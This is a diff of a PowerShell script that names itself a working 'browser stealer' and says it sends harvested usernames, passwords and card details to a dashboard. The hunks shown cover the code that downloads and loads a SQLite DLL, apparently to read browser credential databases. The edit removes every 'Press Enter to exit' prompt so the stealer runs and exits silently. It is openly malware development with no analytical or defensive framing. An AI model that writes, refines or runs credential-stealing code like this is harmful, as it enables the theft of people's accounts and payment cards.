@@ -2,6 +2,7 @@
 # BROWSER STEALER v3.2 — COMPLETE WORKING VERSION
 # Sends credentials (username/email + password) to dashboard
 # Includes url links for credentials and cards
+# No Read-Host — exits cleanly
 # ============================================================
 
 $ErrorActionPreference = "Continue"
@@ -46,13 +47,11 @@ try {
 } catch {
     Write-Log "[!] Download failed: $_"
     Write-Log "[!] Make sure System.Data.SQLite.dll is in your public folder"
-    Read-Host "Press Enter to exit"
     exit
 }
 
 if (-not (Test-Path $dllPath)) {
     Write-Log "[!] DLL not found after download"
-    Read-Host "Press Enter to exit"
     exit
 }
 
@@ -61,7 +60,6 @@ Write-Log "[+] File size: $fileSize bytes"
 
 if ($fileSize -lt 50000) {
     Write-Log "[!] DLL is too small - not a valid DLL"
-    Read-Host "Press Enter to exit"
     exit
 }
 
@@ -75,7 +73,6 @@ try {
     Write-Log "[+] SQLite loaded successfully!"
 } catch {
     Write-Log "[!] Failed to load DLL: $_"
-    Read-Host "Press Enter to exit"
     exit
 }
 
@@ -87,7 +84,6 @@ try {
     Write-Log "[+] SQLite test passed!"
 } catch {
     Write-Log "[!] SQLite test failed: $_"
-    Read-Host "Press Enter to exit"
     exit
 }
 
@@ -529,4 +525,6 @@ Write-Log ""
 Write-Log "[+] Done!"
 Write-Log "[+] Log saved to: $LOGFILE"
 Write-Log ""
-Read-Host "Press Enter to exit"
+
+# ---- EXIT CLEANLY — NO Read-Host ----
+exit
